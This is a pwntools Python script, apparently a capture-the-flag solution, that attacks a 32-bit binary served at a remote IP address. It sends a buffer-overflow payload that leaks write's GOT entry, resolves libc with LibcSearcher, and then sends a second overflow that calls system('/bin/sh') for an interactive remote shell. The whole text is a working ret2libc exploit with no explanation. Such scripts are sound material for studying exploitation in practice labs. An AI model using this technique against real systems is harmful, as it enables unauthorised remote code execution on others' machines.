from pwn import*
from LibcSearcher import*
p = process('./main')
elf = ELF('./main')
p = remote('118.31.11.216',36666)

payload = 'U'*0x70 + p32(elf.plt['write']) + p32(elf.sym['main']) + p32(1) + p32(elf.got['write']) + p32(4)
p.sendline(payload)
write = u32(p.recvuntil('\xF7')[-4:])
log.info('LIBC:\t' + hex(write))
libc = LibcSearcher('write',write)
libc_base = write - libc.dump('write')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump("str_bin_sh")
p.sendline("U"*0x70 + p32(system) + p32(0) + p32(binsh))
p.interactive()
